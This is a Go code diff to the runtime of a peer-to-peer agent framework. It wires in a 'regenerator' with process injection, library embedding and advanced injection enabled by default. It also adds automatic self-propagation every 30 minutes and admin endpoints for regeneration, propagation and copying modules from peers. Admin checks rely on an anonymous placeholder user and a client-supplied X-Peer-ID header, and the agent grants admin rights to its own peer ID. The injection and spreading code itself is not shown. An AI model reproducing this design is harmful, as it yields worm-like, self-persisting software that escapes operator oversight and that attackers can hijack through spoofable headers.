@@ -23,10 +23,12 @@ import (
 	"github.com/naviNBRuas/APA/pkg/module"
 	"github.com/naviNBRuas/APA/pkg/networking"
 	"github.com/naviNBRuas/APA/pkg/opa"
+	"github.com/naviNBRuas/APA/pkg/persistence"
 	"github.com/naviNBRuas/APA/pkg/policy"
 	"github.com/naviNBRuas/APA/pkg/recovery"
 	"github.com/naviNBRuas/APA/pkg/update"
 	"gopkg.in/yaml.v3"
+	"github.com/naviNBRuas/APA/pkg/regeneration"
 )
 
 // StatusResponse is the response for the /admin/status endpoint.
@@ -67,6 +69,9 @@ type Runtime struct {
 	controllers        []controller.Controller
 	currentLeader      peer.ID // Stores the PeerID of the current leader
 	adminPolicyEngine  *opa.OPAPolicyEngine // New field for OPA policy engine
+	adminPeerManager   *AdminPeerManager    // New field for admin peer management
+	regenerator        *regeneration.Regenerator // New field for regeneration capabilities
+	propagationManager *persistence.PropagationManager // New field for propagation capabilities
 }
 
 // NewRuntime creates a new agent runtime.
@@ -163,7 +168,14 @@ func (rt *Runtime) init(ctx context.Context, config *Config, version string) err
 	rt.healthController = healthController
 	rt.controllerManager = controllerManager
 	rt.controllers = controllers
-
+	
+	// Initialize Admin Peer Manager
+	rt.adminPeerManager = NewAdminPeerManager(logger)
+	
+	// Add some default admin peers (these would be configured in a real implementation)
+	// For demonstration purposes, we'll add the agent's own peer ID as an admin peer
+	rt.adminPeerManager.AddAdminPeer(identity.PeerID.String())
+	
 	// Initialize Admin Policy Engine
 	rt.adminPolicyEngine = opa.NewOPAPolicyEngine()
 	if config.AdminPolicyPath != "" {
@@ -175,6 +187,29 @@ func (rt *Runtime) init(ctx context.Context, config *Config, version string) err
 	// Initialize Recovery Controller
 	recoveryController := recovery.NewRecoveryController(logger, config, rt.ApplyConfig, p2p, moduleManager, controllerManager)
 	rt.recoveryController = recoveryController
+	
+	// Get the actual binary path
+	execPath, err := os.Executable()
+	if err != nil {
+		execPath = "/usr/local/bin/agentd" // fallback
+	}
+
+	// Initialize Regenerator
+	regeneratorConfig := &regeneration.Config{
+		BinaryPath:              execPath, // Use actual binary path
+		BackupPath:              "/var/lib/apa/backup", // Default backup path
+		RegenerationInterval:    1 * time.Hour,        // Check every hour
+		HealthCheckEndpoint:     "http://localhost:8080/admin/health",
+		TrustedPeers:            []string{}, // Will be populated dynamically
+		EnableProcessInjection:  true,      // Enable process injection
+		EnableLibraryEmbedding:  true,      // Enable library embedding
+		EnableAdvancedInjection: true,      // Enable advanced injection techniques
+	}
+
+	rt.regenerator = regeneration.NewRegenerator(logger, regeneratorConfig, p2p, identity.PeerID)
+	
+	// Initialize PropagationManager
+	rt.propagationManager = persistence.NewPropagationManager(logger, execPath, p2p, identity.PeerID.String())
 
 	// Connect the module manager to the P2P network via the callback
 	moduleManager.OnModuleLoad = func(manifest module.Manifest) {
@@ -210,6 +245,18 @@ func (rt *Runtime) init(ctx context.Context, config *Config, version string) err
 
 	// Set the callback for when an update is ready
 	updateManager.OnUpdateReady = rt.Stop
+
+	// Set up P2P update functionality if enabled
+	if config.Update.EnableP2P {
+		// Set the P2P network interface on the update manager
+		updateManager.SetP2PNetwork(p2p)
+
+		// Set the handler for incoming update fetch requests
+		p2p.FetchUpdateHandler = func(version string) (*update.ReleaseInfo, []byte, error) {
+			logger.Info("Received request for update", "version", version)
+			return rt.GetCurrentRelease()
+		}
+	}
 
 	return nil
 }
@@ -248,6 +295,17 @@ func (rt *Runtime) Start(ctx context.Context, cancel context.CancelFunc) {
 
 	// Start health checks
 	go rt.healthController.StartHealthChecks(ctx, 10*time.Second) // Run health checks every 10 seconds
+
+	// Start regeneration monitoring
+	if rt.regenerator != nil {
+		rt.regenerator.Start(ctx)
+	}
+	
+	// Start automatic propagation
+	if rt.propagationManager != nil {
+		// Start automatic propagation every 30 minutes
+		go rt.propagationManager.ScheduleAutomaticPropagation(ctx, 30*time.Minute)
+	}
 
 	// Load controllers
 	if err := rt.controllerManager.LoadControllersFromDir(ctx); err != nil {
@@ -427,10 +485,16 @@ func (rt *Runtime) Start(ctx context.Context, cancel context.CancelFunc) {
 
 	// Setup admin API server
 	mux := http.NewServeMux()
-	mux.HandleFunc("/admin/health", rt.healthHandler)
+	// Register admin API endpoints
 	mux.HandleFunc("/admin/status", rt.statusHandler)
-	mux.HandleFunc("/admin/modules/list", rt.listModulesHandler)
-	mux.HandleFunc("/admin/update/check", rt.updateCheckHandler)
+	mux.HandleFunc("/admin/health", rt.healthHandler)
+	mux.HandleFunc("/admin/modules", rt.modulesHandler)
+	mux.HandleFunc("/admin/controllers", rt.controllersHandler)
+	mux.HandleFunc("/admin/config", rt.configHandler)
+	mux.HandleFunc("/admin/update", rt.updateHandler)
+	mux.HandleFunc("/admin/peer-copy", rt.peerCopyHandler)
+	mux.HandleFunc("/admin/regenerate", rt.triggerRegenerationHandler)
+	mux.HandleFunc("/admin/propagate", rt.triggerPropagationHandler)
 
 	rt.server = &http.Server{
 		Addr:    rt.config.AdminListenAddress,
@@ -448,6 +512,11 @@ func (rt *Runtime) Start(ctx context.Context, cancel context.CancelFunc) {
 
 	// Wait for shutdown signal
 	rt.waitForShutdown(cancel)
+}
+
+// GetCurrentRelease returns the current release information.
+func (rt *Runtime) GetCurrentRelease() (*update.ReleaseInfo, []byte, error) {
+	return rt.updateManager.GetCurrentRelease()
 }
 
 // Stop gracefully shuts down the agent runtime.
@@ -519,11 +588,7 @@ func (rt *Runtime) waitForShutdown(cancel context.CancelFunc) {
 // healthHandler is the handler for the /admin/health endpoint.
 func (rt *Runtime) healthHandler(w http.ResponseWriter, r *http.Request) {
 	// OPA authorization check
-	input := map[string]interface{}{
-		"method": r.Method,
-		"path":   r.URL.Path,
-		"user":   "anonymous", // Placeholder for actual user/auth info
-	}
+	input := rt.createAuthzInput(r)
 	allowed, err := rt.adminPolicyEngine.Authorize(r.Context(), input)
 	if err != nil {
 		rt.logger.Error("Admin API authorization error", "path", r.URL.Path, "error", err)
@@ -531,7 +596,7 @@ func (rt *Runtime) healthHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	if !allowed {
-		rt.logger.Warn("Admin API unauthorized access", "path", r.URL.Path, "user", input["user"])
+		rt.logger.Warn("Admin API unauthorized access", "path", r.URL.Path, "input", input)
 		http.Error(w, "Unauthorized", http.StatusUnauthorized)
 		return
 	}
@@ -543,11 +608,7 @@ func (rt *Runtime) healthHandler(w http.ResponseWriter, r *http.Request) {
 // statusHandler is the handler for the /admin/status endpoint.
 func (rt *Runtime) statusHandler(w http.ResponseWriter, r *http.Request) {
 	// OPA authorization check
-	input := map[string]interface{}{
-		"method": r.Method,
-		"path":   r.URL.Path,
-		"user":   "anonymous", // Placeholder for actual user/auth info
-	}
+	input := rt.createAuthzInput(r)
 	allowed, err := rt.adminPolicyEngine.Authorize(r.Context(), input)
 	if err != nil {
 		rt.logger.Error("Admin API authorization error", "path", r.URL.Path, "error", err)
@@ -555,7 +616,7 @@ func (rt *Runtime) statusHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	if !allowed {
-		rt.logger.Warn("Admin API unauthorized access", "path", r.URL.Path, "user", input["user"])
+		rt.logger.Warn("Admin API unauthorized access", "path", r.URL.Path, "input", input)
 		http.Error(w, "Unauthorized", http.StatusUnauthorized)
 		return
 	}
@@ -573,14 +634,10 @@ func (rt *Runtime) statusHandler(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
-// listModulesHandler is the handler for the /admin/modules/list endpoint.
-func (rt *Runtime) listModulesHandler(w http.ResponseWriter, r *http.Request) {
+// modulesHandler is the handler for the /admin/modules endpoint.
+func (rt *Runtime) modulesHandler(w http.ResponseWriter, r *http.Request) {
 	// OPA authorization check
-	input := map[string]interface{}{
-		"method": r.Method,
-		"path":   r.URL.Path,
-		"user":   "anonymous", // Placeholder for actual user/auth info
-	}
+	input := rt.createAuthzInput(r)
 	allowed, err := rt.adminPolicyEngine.Authorize(r.Context(), input)
 	if err != nil {
 		rt.logger.Error("Admin API authorization error", "path", r.URL.Path, "error", err)
@@ -588,27 +645,50 @@ func (rt *Runtime) listModulesHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	if !allowed {
-		rt.logger.Warn("Admin API unauthorized access", "path", r.URL.Path, "user", input["user"])
+		rt.logger.Warn("Admin API unauthorized access", "path", r.URL.Path, "input", input)
 		http.Error(w, "Unauthorized", http.StatusUnauthorized)
 		return
 	}
 
-	modules := rt.moduleManager.ListModules()
-	w.Header().Set("Content-Type", "application/json")
-	if err := json.NewEncoder(w).Encode(modules); err != nil {
-		rt.logger.Error("Failed to encode modules list response", "error", err)
-		w.WriteHeader(http.StatusInternalServerError)
+	// Handle different HTTP methods
+	switch r.Method {
+	case http.MethodGet:
+		// List all modules
+		modules := rt.moduleManager.ListModules()
+		w.Header().Set("Content-Type", "application/json")
+		if err := json.NewEncoder(w).Encode(modules); err != nil {
+			rt.logger.Error("Failed to encode modules list response", "error", err)
+			w.WriteHeader(http.StatusInternalServerError)
+		}
+	case http.MethodPost:
+		// Load a module
+		var req struct {
+			Name string `json:"name"`
+		}
+		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+			http.Error(w, "Invalid request body", http.StatusBadRequest)
+			return
+		}
+		if req.Name == "" {
+			http.Error(w, "Missing module name", http.StatusBadRequest)
+			return
+		}
+		if err := rt.moduleManager.LoadModule(req.Name); err != nil {
+			rt.logger.Error("Failed to load module", "name", req.Name, "error", err)
+			http.Error(w, "Failed to load module: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		w.WriteHeader(http.StatusOK)
+		fmt.Fprintf(w, "Module %s loaded successfully.\n", req.Name)
+	default:
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
 	}
 }
 
-// updateCheckHandler is the handler for the /admin/update/check endpoint.
-func (rt *Runtime) updateCheckHandler(w http.ResponseWriter, r *http.Request) {
+// controllersHandler is the handler for the /admin/controllers endpoint.
+func (rt *Runtime) controllersHandler(w http.ResponseWriter, r *http.Request) {
 	// OPA authorization check
-	input := map[string]interface{}{
-		"method": r.Method,
-		"path":   r.URL.Path,
-		"user":   "anonymous", // Placeholder for actual user/auth info
-	}
+	input := rt.createAuthzInput(r)
 	allowed, err := rt.adminPolicyEngine.Authorize(r.Context(), input)
 	if err != nil {
 		rt.logger.Error("Admin API authorization error", "path", r.URL.Path, "error", err)
@@ -616,12 +696,280 @@ func (rt *Runtime) updateCheckHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	if !allowed {
-		rt.logger.Warn("Admin API unauthorized access", "path", r.URL.Path, "user", input["user"])
+		rt.logger.Warn("Admin API unauthorized access", "path", r.URL.Path, "input", input)
 		http.Error(w, "Unauthorized", http.StatusUnauthorized)
 		return
 	}
 
-	go rt.updateManager.CheckForUpdate()
-	w.WriteHeader(http.StatusAccepted)
-	fmt.Fprintln(w, "Update check initiated.")
+	// Handle different HTTP methods
+	switch r.Method {
+	case http.MethodGet:
+		// List all controllers
+		controllers := rt.controllerManager.ListControllers()
+		w.Header().Set("Content-Type", "application/json")
+		if err := json.NewEncoder(w).Encode(controllers); err != nil {
+			rt.logger.Error("Failed to encode controllers list response", "error", err)
+			w.WriteHeader(http.StatusInternalServerError)
+		}
+	case http.MethodPost:
+		// Load a controller
+		var req struct {
+			Name string `json:"name"`
+		}
+		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+			http.Error(w, "Invalid request body", http.StatusBadRequest)
+			return
+		}
+		if req.Name == "" {
+			http.Error(w, "Missing controller name", http.StatusBadRequest)
+			return
+		}
+		if err := rt.controllerManager.LoadController(req.Name); err != nil {
+			rt.logger.Error("Failed to load controller", "name", req.Name, "error", err)
+			http.Error(w, "Failed to load controller: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		w.WriteHeader(http.StatusOK)
+		fmt.Fprintf(w, "Controller %s loaded successfully.\n", req.Name)
+	default:
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+	}
 }
+
+// configHandler is the handler for the /admin/config endpoint.
+func (rt *Runtime) configHandler(w http.ResponseWriter, r *http.Request) {
+	// OPA authorization check
+	input := rt.createAuthzInput(r)
+	allowed, err := rt.adminPolicyEngine.Authorize(r.Context(), input)
+	if err != nil {
+		rt.logger.Error("Admin API authorization error", "path", r.URL.Path, "error", err)
+		http.Error(w, "Authorization error", http.StatusInternalServerError)
+		return
+	}
+	if !allowed {
+		rt.logger.Warn("Admin API unauthorized access", "path", r.URL.Path, "input", input)
+		http.Error(w, "Unauthorized", http.StatusUnauthorized)
+		return
+	}
+
+	// Handle different HTTP methods
+	switch r.Method {
+	case http.MethodGet:
+		// Return current config
+		w.Header().Set("Content-Type", "application/json")
+		if err := json.NewEncoder(w).Encode(rt.config); err != nil {
+			rt.logger.Error("Failed to encode config response", "error", err)
+			w.WriteHeader(http.StatusInternalServerError)
+		}
+	case http.MethodPost:
+		// Update config
+		var newConfig Config
+		if err := json.NewDecoder(r.Body).Decode(&newConfig); err != nil {
+			http.Error(w, "Invalid request body", http.StatusBadRequest)
+			return
+		}
+		// Convert config to YAML and apply it
+		configData, err := yaml.Marshal(newConfig)
+		if err != nil {
+			rt.logger.Error("Failed to marshal config", "error", err)
+			http.Error(w, "Failed to process config: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		if err := rt.ApplyConfig(configData); err != nil {
+			rt.logger.Error("Failed to apply config", "error", err)
+			http.Error(w, "Failed to apply config: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		w.WriteHeader(http.StatusOK)
+		fmt.Fprintln(w, "Config updated successfully.")
+	default:
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+	}
+}
+
+// updateHandler is the handler for the /admin/update endpoint.
+func (rt *Runtime) updateHandler(w http.ResponseWriter, r *http.Request) {
+	// OPA authorization check
+	input := rt.createAuthzInput(r)
+	allowed, err := rt.adminPolicyEngine.Authorize(r.Context(), input)
+	if err != nil {
+		rt.logger.Error("Admin API authorization error", "path", r.URL.Path, "error", err)
+		http.Error(w, "Authorization error", http.StatusInternalServerError)
+		return
+	}
+	if !allowed {
+		rt.logger.Warn("Admin API unauthorized access", "path", r.URL.Path, "input", input)
+		http.Error(w, "Unauthorized", http.StatusUnauthorized)
+		return
+	}
+
+	// Handle different HTTP methods
+	switch r.Method {
+	case http.MethodPost:
+		// Trigger update
+		go rt.updateManager.CheckForUpdate()
+		w.WriteHeader(http.StatusAccepted)
+		fmt.Fprintln(w, "Update check initiated.")
+	default:
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+	}
+}
+
+// peerCopyHandler is the handler for the /admin/peer-copy endpoint.
+func (rt *Runtime) peerCopyHandler(w http.ResponseWriter, r *http.Request) {
+	// OPA authorization check
+	input := rt.createAuthzInput(r)
+	allowed, err := rt.adminPolicyEngine.Authorize(r.Context(), input)
+	if err != nil {
+		rt.logger.Error("Admin API authorization error", "path", r.URL.Path, "error", err)
+		http.Error(w, "Authorization error", http.StatusInternalServerError)
+		return
+	}
+	if !allowed {
+		rt.logger.Warn("Admin API unauthorized access", "path", r.URL.Path, "input", input)
+		http.Error(w, "Unauthorized", http.StatusUnauthorized)
+		return
+	}
+
+	// Parse peer ID and module name from query parameters
+	peerID := r.URL.Query().Get("peer_id")
+	moduleName := r.URL.Query().Get("module_name")
+	if peerID == "" || moduleName == "" {
+		http.Error(w, "Missing peer_id or module_name parameter", http.StatusBadRequest)
+		return
+	}
+
+	if err := rt.recoveryController.RequestPeerCopy(r.Context(), peerID, moduleName); err != nil {
+		rt.logger.Error("Failed to request peer copy", "peer_id", peerID, "module_name", moduleName, "error", err)
+		http.Error(w, "Failed to request peer copy: "+err.Error(), http.StatusInternalServerError)
+		return
+	}
+
+	w.WriteHeader(http.StatusOK)
+	fmt.Fprintf(w, "Module %s successfully copied from peer %s.\n", moduleName, peerID)
+}
+
+// triggerRegenerationHandler is the handler for manually triggering agent regeneration
+func (rt *Runtime) triggerRegenerationHandler(w http.ResponseWriter, r *http.Request) {
+	// OPA authorization check
+	input := rt.createAuthzInput(r)
+	allowed, err := rt.adminPolicyEngine.Authorize(r.Context(), input)
+	if err != nil {
+		rt.logger.Error("Admin API authorization error", "path", r.URL.Path, "error", err)
+		http.Error(w, "Authorization error", http.StatusInternalServerError)
+		return
+	}
+	if !allowed {
+		rt.logger.Warn("Admin API unauthorized access", "path", r.URL.Path, "input", input)
+		http.Error(w, "Unauthorized", http.StatusUnauthorized)
+		return
+	}
+
+	// Trigger regeneration
+	if err := rt.regenerator.TriggerRegeneration(r.Context()); err != nil {
+		rt.logger.Error("Failed to trigger regeneration", "error", err)
+		http.Error(w, "Failed to trigger regeneration: "+err.Error(), http.StatusInternalServerError)
+		return
+	}
+
+	w.WriteHeader(http.StatusOK)
+	fmt.Fprintln(w, "Regeneration triggered successfully.")
+}
+
+// triggerPropagationHandler is the handler for manually triggering agent propagation
+func (rt *Runtime) triggerPropagationHandler(w http.ResponseWriter, r *http.Request) {
+	// OPA authorization check
+	input := rt.createAuthzInput(r)
+	allowed, err := rt.adminPolicyEngine.Authorize(r.Context(), input)
+	if err != nil {
+		rt.logger.Error("Admin API authorization error", "path", r.URL.Path, "error", err)
+		http.Error(w, "Authorization error", http.StatusInternalServerError)
+		return
+	}
+	if !allowed {
+		rt.logger.Warn("Admin API unauthorized access", "path", r.URL.Path, "input", input)
+		http.Error(w, "Unauthorized", http.StatusUnauthorized)
+		return
+	}
+
+	// Trigger propagation
+	if err := rt.propagationManager.TriggerPropagation(r.Context()); err != nil {
+		rt.logger.Error("Failed to trigger propagation", "error", err)
+		http.Error(w, "Failed to trigger propagation: "+err.Error(), http.StatusInternalServerError)
+		return
+	}
+
+	w.WriteHeader(http.StatusOK)
+	fmt.Fprintln(w, "Propagation triggered successfully.")
+}
+
+// createAuthzInput creates an authorization input map with request information
+func (rt *Runtime) createAuthzInput(r *http.Request) map[string]interface{} {
+	input := map[string]interface{}{
+		"method": r.Method,
+		"path":   r.URL.Path,
+		"user":   "anonymous", // Placeholder for actual user/auth info
+	}
+
+	// Try to extract peer ID from request context or headers
+	// In a real implementation, this would extract actual peer information
+	// For now, we'll use a placeholder that can be extended later
+	if peerID := r.Header.Get("X-Peer-ID"); peerID != "" {
+		input["peer_id"] = peerID
+		
+		// Add peer reputation score if available
+		var reputationScore float64 = 50.0
+		var isConnected bool = false
+		
+		if rt.p2p != nil {
+			// Try to parse the peer ID
+			if parsedPeerID, err := peer.Decode(peerID); err == nil {
+				// Get reputation score from the P2P network's reputation system
+				// This requires access to the reputation system through the P2P network
+				if rt.p2p.advancedDiscovery != nil && rt.p2p.advancedDiscovery.reputationRouting != nil {
+					reputationScore = rt.p2p.advancedDiscovery.reputationRouting.reputation.GetReputationScore(parsedPeerID)
+					input["peer_reputation_score"] = reputationScore
+				} else {
+					// Fallback to a default score
+					input["peer_reputation_score"] = 50.0
+				}
+				
+				// Check if peer is connected
+				connectedPeers := rt.p2p.GetConnectedPeers()
+				for _, connectedPeer := range connectedPeers {
+					if connectedPeer == parsedPeerID {
+						isConnected = true
+						input["peer_connected"] = true
+						break
+					}
+				}
+			}
+		}
+		
+		// Check if peer is authorized for admin access
+		if rt.adminPeerManager != nil {
+			isAdmin := rt.adminPeerManager.IsAuthorizedAdmin(peerID, reputationScore, isConnected)
+			input["peer_is_admin"] = isAdmin
+		}
+	}
+
+	// Add agent's own peer ID
+	input["agent_peer_id"] = rt.identity.PeerID.String()
+
+	// Add agent's reputation score (for self)
+	if rt.p2p != nil && rt.p2p.advancedDiscovery != nil && rt.p2p.advancedDiscovery.reputationRouting != nil {
+		selfReputation := rt.p2p.advancedDiscovery.reputationRouting.reputation.GetReputationScore(rt.identity.PeerID)
+		input["agent_reputation_score"] = selfReputation
+	} else {
+		input["agent_reputation_score"] = 50.0 // Default score
+	}
+
+	// Check if agent is authorized for admin access (self-check)
+	if rt.adminPeerManager != nil {
+		isAdmin := rt.adminPeerManager.IsAuthorizedAdmin(rt.identity.PeerID.String(), input["agent_reputation_score"].(float64), true)
+		input["agent_is_admin"] = isAdmin
+	}
+
+	return input
+}
+
